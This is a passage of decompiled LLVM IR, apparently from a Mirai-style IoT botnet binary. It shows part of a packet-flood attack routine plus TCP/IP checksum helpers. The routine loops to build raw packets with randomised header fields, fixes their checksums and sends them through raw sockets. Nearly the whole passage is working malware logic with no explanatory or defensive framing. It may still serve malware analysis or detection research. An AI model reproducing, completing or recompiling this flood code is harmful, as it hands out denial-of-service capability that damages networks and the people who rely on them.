  %v6_c688 = inttoptr i32 %v5_c688 to i32*
  %v7_c688 = load i32, i32* %v6_c688, align 4
  store i32 %v7_c688, i32* @r5, align 4
  %v7_c68c = icmp eq i8 %v3_c684, 31
  store i1 %v7_c68c, i1* %cpsr_z.global-to-local, align 1
  %v1_c690 = add i32 %v7_c688, 20
  store i32 %v1_c690, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_c684, 32
  br i1 %tmp67, label %dec_label_pc_c788, label %dec_label_pc_c698

dec_label_pc_c698:                                ; preds = %dec_label_pc_c678
  store i32 %v6_c38c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c6a4

dec_label_pc_c6a4:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c698
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c6b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c6b0, label %dec_label_pc_c804, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c6a4
  %v1_c6bc = phi i32 [ %v1_c7f8, %dec_label_pc_c7e8 ], [ 65535, %dec_label_pc_c6a4 ]
  store i32 %v3_c3f8, i32* %r1.global-to-local, align 4
  %v9_c6bc = icmp eq i32 %v3_c3f8, %v1_c6bc
  store i1 %v9_c6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6bc, label %dec_label_pc_c818, label %dec_label_pc_c6c4

dec_label_pc_c6c4:                                ; preds = %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge, %dec_label_pc_c6b8
  %v1_c6c8 = phi i32 [ %v1_c6c8.pre, %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge ], [ %v1_c6bc, %dec_label_pc_c6b8 ]
  store i32 %v3_c3fc, i32* %r2.global-to-local, align 4
  %v9_c6c8 = icmp eq i32 %v3_c3fc, %v1_c6c8
  store i1 %v9_c6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6c8, label %dec_label_pc_c82c, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge, %dec_label_pc_c6c4
  %v1_c6d4 = phi i32 [ %v1_c6d4.pre, %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge ], [ %v1_c6c8, %dec_label_pc_c6c4 ]
  store i32 %v5_c2c8, i32* %r3.global-to-local, align 4
  %v9_c6d4 = icmp eq i32 %v5_c2c8, %v1_c6d4
  store i1 %v9_c6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6d4, label %dec_label_pc_c840, label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge, %dec_label_pc_c6d0
  %v1_c6e0 = phi i32 [ %v1_c6e0.pre, %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge ], [ %v1_c6d4, %dec_label_pc_c6d0 ]
  store i32 %v6_c2e0, i32* %r0.global-to-local, align 4
  %v9_c6e0 = icmp eq i32 %v6_c2e0, %v1_c6e0
  store i1 %v9_c6e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6e0, label %dec_label_pc_c854, label %dec_label_pc_c6e8

dec_label_pc_c6e8:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c6dc
  %v0_c6e8 = load i32, i32* @fp, align 4
  %v2_c6e8 = icmp eq i32 %v0_c6e8, 0
  store i1 %v2_c6e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c6e8, label %dec_label_pc_c6f0, label %dec_label_pc_c864

dec_label_pc_c6f0:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c854, %dec_label_pc_c864
  %v2_c6f4 = load i32, i32* @r5, align 4
  %v3_c6f4 = add i32 %v2_c6f4, 10
  %v4_c6f4 = inttoptr i32 %v3_c6f4 to i16*
  store i16 0, i16* %v4_c6f4, align 2
  %v0_c6f8 = load i32, i32* @r5, align 4
  store i32 %v0_c6f8, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c700 = call i32 @checksum_generic(i32 %v0_c6f8, i32 20)
  %v3_c700 = trunc i32 %v2_c700 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c708 = load i32, i32* @r5, align 4
  %v4_c708 = add i32 %v3_c708, 10
  %v5_c708 = inttoptr i32 %v4_c708 to i16*
  store i16 %v3_c700, i16* %v5_c708, align 2
  %v0_c70c = load i32, i32* @r6, align 4
  store i32 %v0_c70c, i32* @r1, align 4
  %v0_c710 = load i32, i32* %r2.global-to-local, align 4
  %v1_c710 = trunc i32 %v0_c710 to i16
  %v3_c710 = add i32 %v0_c70c, 16
  %v4_c710 = inttoptr i32 %v3_c710 to i16*
  store i16 %v1_c710, i16* %v4_c710, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c71c = load i32, i32* @r5, align 4
  store i32 %v0_c71c, i32* %r0.global-to-local, align 4
  %v4_c720 = call i32 @checksum_tcpudp(i32 %v0_c71c, i32 %v0_c70c, i32 10240, i32 40)
  %v5_c720 = trunc i32 %v4_c720 to i16
  store i32 %v4_c720, i32* %r0.global-to-local, align 4
  %v3_c724 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c724, i32* %r3.global-to-local, align 4
  %v3_c728 = mul i32 %v3_c724, 32
  store i32 %v3_c728, i32* %lr.global-to-local, align 4
  %v3_c72c = load i32, i32* @r6, align 4
  %v4_c72c = add i32 %v3_c72c, 16
  %v5_c72c = inttoptr i32 %v4_c72c to i16*
  store i16 %v5_c720, i16* %v5_c72c, align 2
  %v0_c730 = load i32, i32* %lr.global-to-local, align 4
  %v1_c730 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_c730, -8
  %v5_c730 = add i32 %v0_c730, %tmp68
  store i32 %v5_c730, i32* %lr.global-to-local, align 4
  %v0_c734 = load i32, i32* @r6, align 4
  %v1_c734 = add i32 %v0_c734, 2
  %v2_c734 = inttoptr i32 %v1_c734 to i16*
  %v3_c734 = load i16, i16* %v2_c734, align 2
  %v4_c734 = zext i16 %v3_c734 to i32
  store i32 %v4_c734, i32* @r6, align 4
  %v1_c738 = load i32, i32* @r8, align 4
  %v2_c738 = add i32 %v1_c738, %v5_c730
  store i32 %v2_c738, i32* @lr, align 4
  %v3_c73c = add i32 %v2_c738, 2
  %v4_c73c = inttoptr i32 %v3_c73c to i16*
  store i16 %v3_c734, i16* %v4_c73c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c748 = load i32, i32* @r5, align 4
  store i32 %v0_c748, i32* %r1.global-to-local, align 4
  %v0_c74c = load i32, i32* @sl, align 4
  store i32 %v0_c74c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @lr, align 4
  %v6_c75c = call i32 @__libc_sendto(i32 %v0_c74c, i32 %v0_c748, i32 60, i32 16384, i32 %v0_c754, i32 16)
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  %v1_c764 = add i32 %v3_c760, 1
  store i32 %v1_c764, i32* %r0.global-to-local, align 4
  %v1_c768 = load i32, i32* @r7, align 4
  %v9_c768 = icmp eq i32 %v1_c764, %v1_c768
  store i1 %v9_c768, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c764, i32* %stack_var_-44, align 4
  %v5_c770 = icmp slt i32 %v1_c764, %v1_c768
  br i1 %v5_c770, label %dec_label_pc_c678, label %dec_label_pc_c774

dec_label_pc_c774:                                ; preds = %dec_label_pc_c6f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c778 = icmp eq i32 %v1_c768, 0
  store i1 %v2_c778, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c778, label %dec_label_pc_c664, label %dec_label_pc_c674

dec_label_pc_c788:                                ; preds = %dec_label_pc_c678
  %v1_c788 = add i32 %v2_c680, 16
  %v2_c788 = inttoptr i32 %v1_c788 to i32*
  %v3_c788 = load i32, i32* %v2_c788, align 4
  store i32 %v3_c788, i32* %r4.global-to-local, align 4
  %v0_c78c = call i32 @rand_next()
  store i32 %v0_c78c, i32* %r0.global-to-local, align 4
  %v3_c790 = load i32, i32* %stack_var_-44, align 4
  %v5_c798 = mul i32 %v3_c790, 24
  %v0_c79c = load i32, i32* %r4.global-to-local, align 4
  %v1_c79c = and i32 %v0_c79c, 16711680
  %v3_c7a0 = udiv i32 %v0_c79c, 16777216
  %v4_c7a4 = udiv i32 %v1_c79c, 256
  %v5_c7a4 = or i32 %v4_c7a4, %v3_c7a0
  store i32 %v5_c7a4, i32* %r2.global-to-local, align 4
  %v1_c7a8 = load i32, i32* @r8, align 4
  %v2_c7a8 = add i32 %v1_c7a8, %v5_c798
  store i32 %v2_c7a8, i32* %r1.global-to-local, align 4
  %v1_c7ac = and i32 %v0_c79c, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_c7ac, i32* %r3.global-to-local, align 4
  %v1_c7b0 = add i32 %v2_c7a8, 20
  %v2_c7b0 = inttoptr i32 %v1_c7b0 to i8*
  %v3_c7b0 = load i8, i8* %v2_c7b0, align 1
  %v4_c7b0 = zext i8 %v3_c7b0 to i32
  %v4_c7b4 = mul i32 %v1_c7ac, 256
  %v4_c7b8 = mul i32 %v0_c79c, 16777216
  %v5_c7b4 = or i32 %v4_c7b4, %v4_c7b8
  %v5_c7b8 = or i32 %v5_c7b4, %v5_c7a4
  %v7_c7bc = lshr i32 %v0_c78c, %v4_c7b0
  %v8_c7bc = add i32 %v7_c7bc, %v5_c7b8
  store i32 %v8_c7bc, i32* %r2.global-to-local, align 4
  %v1_c7c0 = and i32 %v8_c7bc, 16711680
  store i32 %v1_c7c0, i32* %r0.global-to-local, align 4
  %v1_c7cc = and i32 %v8_c7bc, 65280
  store i32 %v1_c7cc, i32* %r1.global-to-local, align 4
  %v5_c7d4 = call i32 @llvm.bswap.i32(i32 %v8_c7bc)
  %v1_c7d8 = load i32, i32* @r5, align 4
  %v2_c7d8 = add i32 %v1_c7d8, 16
  %v3_c7d8 = inttoptr i32 %v2_c7d8 to i32*
  store i32 %v5_c7d4, i32* %v3_c7d8, align 4
  store i32 %v6_c38c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c6a4

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c698
  %v0_c7e8 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c7f0 = load i32, i32* @r5, align 4
  %v2_c7f0 = add i32 %v1_c7f0, 12
  %v3_c7f0 = inttoptr i32 %v2_c7f0 to i32*
  store i32 %v0_c7e8, i32* %v3_c7f0, align 4
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  %v0_c7f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c7f8 = add i32 %v0_c7f8, -1
  store i32 %v1_c7f8, i32* @r4, align 4
  %v9_c7fc = icmp eq i32 %v3_c3f4, %v1_c7f8
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7fc, label %dec_label_pc_c804, label %dec_label_pc_c6b8

dec_label_pc_c804:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c6a4
  %v0_c804 = call i32 @rand_next()
  %v1_c804 = trunc i32 %v0_c804 to i16
  store i32 %v0_c804, i32* %r0.global-to-local, align 4
  store i32 %v3_c3f8, i32* %r1.global-to-local, align 4
  %v1_c80c = load i32, i32* @r4, align 4
  %v9_c80c = icmp eq i32 %v3_c3f8, %v1_c80c
  store i1 %v9_c80c, i1* %cpsr_z.global-to-local, align 1
  %v3_c810 = load i32, i32* @r5, align 4
  %v4_c810 = add i32 %v3_c810, 4
  %v5_c810 = inttoptr i32 %v4_c810 to i16*
  store i16 %v1_c804, i16* %v5_c810, align 2
  br i1 %v9_c80c, label %dec_label_pc_c818, label %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge

dec_label_pc_c804.dec_label_pc_c6c4_crit_edge:    ; preds = %dec_label_pc_c804
  %v1_c6c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6c4

dec_label_pc_c818:                                ; preds = %dec_label_pc_c804, %dec_label_pc_c6b8
  %v0_c818 = call i32 @rand_next()
  %v1_c818 = trunc i32 %v0_c818 to i16
  store i32 %v0_c818, i32* %r0.global-to-local, align 4
  store i32 %v3_c3fc, i32* %r2.global-to-local, align 4
  %v1_c820 = load i32, i32* @r4, align 4
  %v9_c820 = icmp eq i32 %v3_c3fc, %v1_c820
  store i1 %v9_c820, i1* %cpsr_z.global-to-local, align 1
  %v3_c824 = load i32, i32* @r5, align 4
  %v4_c824 = add i32 %v3_c824, 20
  %v5_c824 = inttoptr i32 %v4_c824 to i16*
  store i16 %v1_c818, i16* %v5_c824, align 2
  br i1 %v9_c820, label %dec_label_pc_c82c, label %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge

dec_label_pc_c818.dec_label_pc_c6d0_crit_edge:    ; preds = %dec_label_pc_c818
  %v1_c6d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6d0

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c818, %dec_label_pc_c6c4
  %v0_c82c = call i32 @rand_next()
  %v1_c82c = trunc i32 %v0_c82c to i16
  store i32 %v0_c82c, i32* %r0.global-to-local, align 4
  store i32 %v5_c2c8, i32* %r3.global-to-local, align 4
  %v1_c834 = load i32, i32* @r4, align 4
  %v9_c834 = icmp eq i32 %v5_c2c8, %v1_c834
  store i1 %v9_c834, i1* %cpsr_z.global-to-local, align 1
  %v3_c838 = load i32, i32* @r6, align 4
  %v4_c838 = add i32 %v3_c838, 2
  %v5_c838 = inttoptr i32 %v4_c838 to i16*
  store i16 %v1_c82c, i16* %v5_c838, align 2
  br i1 %v9_c834, label %dec_label_pc_c840, label %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge

dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge:    ; preds = %dec_label_pc_c82c
  %v1_c6e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c840:                                ; preds = %dec_label_pc_c82c, %dec_label_pc_c6d0
  %v0_c840 = call i32 @rand_next()
  %v1_c844 = load i32, i32* @r6, align 4
  %v2_c844 = add i32 %v1_c844, 4
  %v3_c844 = inttoptr i32 %v2_c844 to i32*
  store i32 %v0_c840, i32* %v3_c844, align 4
  store i32 %v6_c2e0, i32* %r0.global-to-local, align 4
  %v1_c84c = load i32, i32* @r4, align 4
  %v9_c84c = icmp eq i32 %v6_c2e0, %v1_c84c
  store i1 %v9_c84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c84c, label %dec_label_pc_c854, label %dec_label_pc_c6e8

dec_label_pc_c854:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c6dc
  %v0_c854 = call i32 @rand_next()
  store i32 %v0_c854, i32* %r0.global-to-local, align 4
  %v0_c858 = load i32, i32* @fp, align 4
  %v2_c858 = icmp eq i32 %v0_c858, 0
  store i1 %v2_c858, i1* %cpsr_z.global-to-local, align 1
  %v1_c85c = load i32, i32* @r6, align 4
  %v2_c85c = add i32 %v1_c85c, 8
  %v3_c85c = inttoptr i32 %v2_c85c to i32*
  store i32 %v0_c854, i32* %v3_c85c, align 4
  br i1 %v2_c858, label %dec_label_pc_c6f0, label %dec_label_pc_c864

dec_label_pc_c864:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c854
  %v0_c864 = call i32 @rand_next()
  %v1_c864 = trunc i32 %v0_c864 to i16
  store i32 %v0_c864, i32* %r0.global-to-local, align 4
  %v3_c868 = load i32, i32* @r6, align 4
  %v4_c868 = add i32 %v3_c868, 18
  %v5_c868 = inttoptr i32 %v4_c868 to i16*
  store i16 %v1_c864, i16* %v5_c868, align 2
  br label %dec_label_pc_c6f0

dec_label_pc_c870:                                ; preds = %dec_label_pc_c3b0
  %v0_c870 = load i32, i32* @sl, align 4
  store i32 %v0_c870, i32* %r0.global-to-local, align 4
  %v1_c874 = call i32 @__GI___libc_close(i32 %v0_c870)
  store i32 %v1_c874, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c878

dec_label_pc_c878:                                ; preds = %entry, %dec_label_pc_c870
  %v1_c880 = phi i32 [ %v3_c3a0, %entry ], [ %v1_c874, %dec_label_pc_c870 ]
  store i32 %v3_c1dc, i32* %r4.global-to-local, align 4
  store i32 %v24_c1dc, i32* %fp.global-to-local, align 4
  store i32 %v27_c1dc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c880

; uselistorder directives
  uselistorder i32 %v0_c864, { 1, 0 }
  uselistorder i32 %v0_c82c, { 1, 0 }
  uselistorder i32 %v0_c818, { 1, 0 }
  uselistorder i32 %v0_c804, { 1, 0 }
  uselistorder i32 %v1_c7f8, { 1, 2, 0 }
  uselistorder i32 %v0_c79c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_c764, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c730, { 1, 0 }
  uselistorder i32 %v4_c720, { 1, 0 }
  uselistorder i1 %v3_c6b0, { 1, 0 }
  uselistorder i32 %v2_c654, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c4bc, { 1, 2, 0 }
  uselistorder i32 %v1_c488, { 2, 1, 0 }
  uselistorder i32 %v1_c484, { 2, 0, 1 }
  uselistorder i32 %v1_c480, { 2, 0, 1 }
  uselistorder i32 %v1_c47c, { 2, 0, 1 }
  uselistorder i32 %v1_c458, { 1, 0 }
  uselistorder i32 %v3_c3f4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c3e8, { 1, 0, 2 }
  uselistorder i32 %v0_c3e4, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i1 %v7_c3a4, { 1, 0 }
  uselistorder i32 %v3_c3a0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c38c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_c2e0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c2c8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c24c, { 1, 0 }
  uselistorder i32 %v7_c234, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 41, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32*, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 100, 101, 102, 103, 104, 105, 106, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 99, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c878, { 1, 0 }
  uselistorder label %dec_label_pc_c864, { 1, 0 }
  uselistorder label %dec_label_pc_c6f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c674, { 1, 0 }
  uselistorder label %dec_label_pc_c664, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8ac, label %dec_label_pc_c894

dec_label_pc_c894:                                ; preds = %entry
  %v0_c89c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %dec_label_pc_c898, %dec_label_pc_c894
  %v0_c8a4 = phi i32 [ %v2_c8a4, %dec_label_pc_c898 ], [ 0, %dec_label_pc_c894 ]
  %v0_c89c = phi i32 [ %v5_c89c, %dec_label_pc_c898 ], [ %v0_c89c.pre, %dec_label_pc_c894 ]
  %v0_c898 = phi i32 [ %v1_c898, %dec_label_pc_c898 ], [ %arg1, %dec_label_pc_c894 ]
  %v1_c898 = add i32 %v0_c898, -2
  %v1_c89c = inttoptr i32 %v0_c89c to i16*
  %v2_c89c = load i16, i16* %v1_c89c, align 2
  %v3_c89c = zext i16 %v2_c89c to i32
  %v5_c89c = add i32 %v0_c89c, -2
  store i32 %v5_c89c, i32* @r0, align 4
  %v2_c8a4 = add i32 %v3_c89c, %v0_c8a4
  %v1_c898.cmp = icmp ugt i32 %v1_c898, 1
  br i1 %v1_c898.cmp, label %dec_label_pc_c898, label %dec_label_pc_c8ac.loopexit

dec_label_pc_c8ac.loopexit:                       ; preds = %dec_label_pc_c898
  br label %dec_label_pc_c8ac

dec_label_pc_c8ac:                                ; preds = %entry, %dec_label_pc_c8ac.loopexit
  %v1_c8b4 = phi i32 [ %v2_c8a4, %dec_label_pc_c8ac.loopexit ], [ 0, %entry ]
  %v0_c8ac = phi i32 [ %v1_c898, %dec_label_pc_c8ac.loopexit ], [ %arg1, %entry ]
  %v7_c8ac = icmp eq i32 %v0_c8ac, 1
  br i1 %v7_c8ac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8ac
  %v1_c8b0 = load i32, i32* @r0, align 4
  %v2_c8b0 = inttoptr i32 %v1_c8b0 to i8*
  %v3_c8b0 = load i8, i8* %v2_c8b0, align 1
  %v4_c8b0 = zext i8 %v3_c8b0 to i32
  %v3_c8b4 = add i32 %v1_c8b4, %v4_c8b0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8ac, %bb
  %v0_c8b8 = phi i32 [ %v1_c8b4, %dec_label_pc_c8ac ], [ %v3_c8b4, %bb ]
  %v3_c8bc = urem i32 %v0_c8b8, 65536
  %v4_c8c0 = udiv i32 %v0_c8b8, 65536
  %v5_c8c0 = add nuw nsw i32 %v4_c8c0, %v3_c8bc
  %v4_c8c4 = udiv i32 %v5_c8c0, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v5_c8c0
  %v1_c8c8 = urem i32 %v5_c8c4, 65536
  %v3_c8d0 = xor i32 %v1_c8c8, 65535
  ret i32 %v3_c8d0

; uselistorder directives
  uselistorder i32 %v5_c8c0, { 1, 0 }
  uselistorder i32 %v5_c89c, { 1, 0 }
  uselistorder i32 %v1_c898, { 1, 0, 2 }
  uselistorder i32 %v0_c89c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8ac, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8e8 = add i32 %arg1, 12
  %v2_c8e8 = inttoptr i32 %v1_c8e8 to i32*
  %v3_c8e8 = load i32, i32* %v2_c8e8, align 4
  %v1_c8ec = add i32 %arg1, 16
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v7_c8f0 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f0, label %dec_label_pc_c8fc.preheader, label %dec_label_pc_c910

dec_label_pc_c8fc.preheader:                      ; preds = %entry
  %v0_c900.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c8fc

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8fc.preheader, %dec_label_pc_c8fc
  %v0_c908 = phi i32 [ 0, %dec_label_pc_c8fc.preheader ], [ %v2_c908, %dec_label_pc_c8fc ]
  %v0_c900 = phi i32 [ %v0_c900.pre, %dec_label_pc_c8fc.preheader ], [ %v5_c900, %dec_label_pc_c8fc ]
  %v0_c8fc = phi i32 [ %arg3, %dec_label_pc_c8fc.preheader ], [ %v1_c8fc, %dec_label_pc_c8fc ]
  %v1_c8fc = add nsw i32 %v0_c8fc, -2
  %v1_c900 = inttoptr i32 %v0_c900 to i16*
  %v2_c900 = load i16, i16* %v1_c900, align 2
  %v3_c900 = zext i16 %v2_c900 to i32
  %v5_c900 = add i32 %v0_c900, -2
  store i32 %v5_c900, i32* @r1, align 4
  %v2_c908 = add i32 %v3_c900, %v0_c908
  %v8_c90c = icmp sgt i32 %v1_c8fc, 1
  br i1 %v8_c90c, label %dec_label_pc_c8fc, label %dec_label_pc_c910.loopexit

dec_label_pc_c910.loopexit:                       ; preds = %dec_label_pc_c8fc
  br label %dec_label_pc_c910

dec_label_pc_c910:                                ; preds = %dec_label_pc_c910.loopexit, %entry
  %v1_c91c = phi i32 [ %v2_c908, %dec_label_pc_c910.loopexit ], [ 0, %entry ]
  %v0_c910 = phi i32 [ %v1_c8fc, %dec_label_pc_c910.loopexit ], [ %arg3, %entry ]
  %v7_c910 = icmp eq i32 %v0_c910, 1
  br i1 %v7_c910, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c910
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c910
  %v1_c914 = load i32, i32* @r1, align 4
  %v2_c914 = inttoptr i32 %v1_c914 to i8*
  %v3_c914 = load i8, i8* %v2_c914, align 1
  %v4_c914 = zext i8 %v3_c914 to i32
  %v3_c91c = add i32 %v4_c914, %v1_c91c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c944 = phi i32 [ %v1_c91c, %.thread ], [ %v3_c91c, %bb ]
  %v0_c924 = mul i32 %v3_c8e8, 65536
  %v3_c924 = udiv i32 %v0_c924, 65536
  %v3_c928 = urem i32 %v3_c8ec, 65536
  %v4_c930 = udiv i32 %v3_c8e8, 65536
  %v2_c92c = add nuw nsw i32 %v3_c928, %v4_c930
  %v5_c930 = add nuw nsw i32 %v2_c92c, %v3_c924
  %v1_c934 = add i32 %arg1, 9
  %v2_c934 = inttoptr i32 %v1_c934 to i8*
  %v3_c934 = load i8, i8* %v2_c934, align 1
  %v4_c934 = zext i8 %v3_c934 to i32
  %v4_c938 = udiv i32 %v3_c8ec, 65536
  %v3_c940 = mul nuw nsw i32 %v4_c934, 256
  %v5_c938 = add i32 %v4_c938, %arg2
  %v2_c93c = add i32 %v5_c938, %v1_c944
  %v2_c944 = add i32 %v2_c93c, %v5_c930
  %v2_c948 = add i32 %v2_c944, %v3_c940
  %tmp = icmp ult i32 %v2_c948, 65536
  br i1 %tmp, label %dec_label_pc_c968, label %dec_label_pc_c954

dec_label_pc_c954:                                ; preds = %bb19, %dec_label_pc_c954
  %v2_c95c5 = phi i32 [ %v2_c95c, %dec_label_pc_c954 ], [ %v2_c948, %bb19 ]
  %v3_c9606.in = phi i32 [ %v2_c95c, %dec_label_pc_c954 ], [ %v2_c948, %bb19 ]
  %v3_c9606 = udiv i32 %v3_c9606.in, 65536
  %v3_c958 = urem i32 %v2_c95c5, 65536
  %v2_c95c = add nuw nsw i32 %v3_c958, %v3_c9606
  %tmp20 = icmp ult i32 %v2_c95c, 65536
  br i1 %tmp20, label %dec_label_pc_c968.loopexit, label %dec_label_pc_c954

dec_label_pc_c968.loopexit:                       ; preds = %dec_label_pc_c954
  br label %dec_label_pc_c968

dec_label_pc_c968:                                ; preds = %dec_label_pc_c968.loopexit, %bb19
  %v0_c968 = phi i32 [ %v2_c95c, %dec_label_pc_c968.loopexit ], [ %v2_c948, %bb19 ]
  %v1_c968 = urem i32 %v0_c968, 65536
  %v3_c970 = xor i32 %v1_c968, 65535
  ret i32 %v3_c970

; uselistorder directives
  uselistorder i32 %v2_c95c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c948, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c91c, { 1, 0 }
  uselistorder i32 %v5_c900, { 1, 0 }
